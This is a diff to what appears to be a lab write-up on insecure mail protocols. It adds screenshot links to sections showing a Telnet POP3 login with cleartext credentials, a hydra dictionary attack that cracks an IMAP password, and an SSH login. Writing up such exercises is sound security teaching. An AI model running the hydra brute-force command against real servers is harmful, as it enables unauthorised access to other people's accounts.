@@ -17,18 +17,24 @@ USER frank
 PASS D2xc9CgD
 STAT
 ```
+![Telnet POP3 Connection](images/Telnet-110.png)
+
 ## 💥 Phase 2: Password Brute-Forcing (IMAP)
 When services do not implement rate limiting or account lockouts, they are vulnerable to brute-force attacks. I used hydra to launch a dictionary attack against an IMAP server at 10.112.158.237 targeting the user lazie.   By utilizing the rockyou.txt wordlist, Hydra successfully tested thousands of passwords and cracked the account, revealing the valid password butterfly
 ```Bash
 
 hydra -l lazie -P rockyou.txt -f 10.112.158.237 imap -V
 ```
+![Hydra Brute Force Attack](images/Hydra.png)
+
 ## 🔒 Phase 3: Secure Remote Access (SSH)
     To mitigate the risks of cleartext credentials being intercepted over the network, secure protocols like SSH (Secure Shell) must be used. I connected to the target machine (10.112.158.237) as the user mark via SSH.   This provided an encrypted terminal session on the Ubuntu 20.04.6 LTS server, allowing safe remote management and file access
 ```Bash
-
+    
 ssh mark@10.112.158.237
 ```
+![Secure SSH Login](images/SSh.png)
+
 🎉 Key Takeaways
 
     Legacy protocols like POP3 (Port 110) and unencrypted IMAP transmit credentials in plain text and can be interacted with directly using tools like Telnet.
